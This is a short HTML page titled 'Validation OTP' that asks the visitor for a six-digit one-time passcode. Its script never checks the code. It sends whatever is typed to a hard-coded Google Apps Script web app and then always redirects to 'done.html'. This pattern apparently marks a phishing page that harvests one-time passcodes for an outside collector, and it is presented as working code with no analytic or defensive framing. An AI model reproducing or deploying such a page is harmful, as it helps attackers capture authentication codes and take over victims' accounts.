<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Validation OTP</title>

  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">

  <style>
    :root{
      --blue-mid:#074f87;
      --blue-dark:#063f73;
      --input-border:#dadada;
      --submit-grey:#9e9e9e;
    }

    body{
      margin:0;
      font-family:"Montserrat", sans-serif;
      background:linear-gradient(180deg, var(--blue-mid), var(--blue-dark));
      color:#fff;
    }

    .page{
      min-height:100vh;
      padding:30px 20px;
      text-align:center;
    }

    .title{
      font-size:28px;
      font-weight:800;
      margin-top:10px;
    }

    .card{
      background:#fff;
      padding:22px;
      width:100%;
      max-width:700px;
      margin:auto;
      border-radius:20px;
      color:#000;
    }

    .label{
      font-size:18px;
      font-weight:700;
      margin-bottom:12px;
    }

    .input{
      width:100%;
      border:1px solid var(--input-border);
      padding:14px;
      font-size:18px;
      border-radius:12px;
      margin-bottom:20px;
    }

    .btn{
      width:100%;
      background:var(--submit-grey);
      padding:16px;
      border:none;
      border-radius:30px;
      font-weight:800;
      font-size:18px;
      cursor:pointer;
    }
  </style>
</head>

<body>

<div class="page">

  <div class="title">VALIDATION OTP</div>

  <div class="card">
    <div class="label">Validation OTP</div>

    <input id="otpInput" class="input" type="tel" maxlength="6" placeholder="Enter OTP">

    <button id="validateBtn" class="btn">Validate</button>
  </div>

</div>

<script>
  const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbx4u9G1KhfKRDV_uK3g-n0aDbyVPAj1nly8LkC2oILkjfvs8weP0C5Shrhigp6EIFHCIQ/exec";

  document.getElementById("validateBtn").addEventListener("click", async ()=>{
      const otp = document.getElementById("otpInput").value.trim();

      await fetch(WEBAPP_URL,{
          method:"POST",
          headers:{ "Content-Type":"application/json" },
          body:JSON.stringify({ otp })
      });

      window.location.href = "done.html";
  });
</script>

</body>
</html>
